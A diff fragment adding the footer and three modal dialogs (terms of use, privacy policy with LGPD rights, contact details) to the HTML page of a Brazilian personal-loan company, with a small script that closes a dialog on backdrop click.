+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/></svg>Instituição regulada</span>
+  </div>
+</footer>
+
+<dialog id="ss-termos" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Termos de Uso</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Aceitação dos Termos</h3>
+    <p>Ao acessar e utilizar os serviços da SuperSim, você concorda com estes Termos de Uso.</p>
+    <h3>2. Serviços Oferecidos</h3>
+    <p>A SuperSim é uma instituição financeira digital que oferece serviços de empréstimo pessoal com aprovação rápida e processo 100% online.</p>
+    <h3>3. Elegibilidade</h3>
+    <ul><li>Ser maior de 18 anos</li><li>Possuir CPF válido</li><li>Ter conta bancária ativa em seu nome</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-privacidade" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Política de Privacidade</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Coleta de Dados</h3>
+    <p>A SuperSim coleta dados pessoais, de contato, financeiros e de navegação.</p>
+    <h3>2. Seus Direitos (LGPD)</h3>
+    <ul><li>Acessar seus dados pessoais</li><li>Corrigir dados incompletos</li><li>Solicitar exclusão de dados</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-contato" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Fale Conosco</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4>Email</h4><p>contato@supersim.com.br</p></div></div>
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/></svg></div><div><h4>ParceiroChat</h4><p>(11) 98765-4321</p></div></div>
+    <div class="ss-contact-note"><p><strong>CNPJ:</strong> 30.680.829/0001-43</p><p><strong>Razão Social:</strong> SuperSim Soluções Financeiras Ltda.</p></div>
+  </div>
+</dialog>
+
+<script>
+document.querySelectorAll(".ss-dialog").forEach(function(d){d.addEventListener("click",function(e){if(e.target===d)d.close();});});
+</script>
+</body></html>
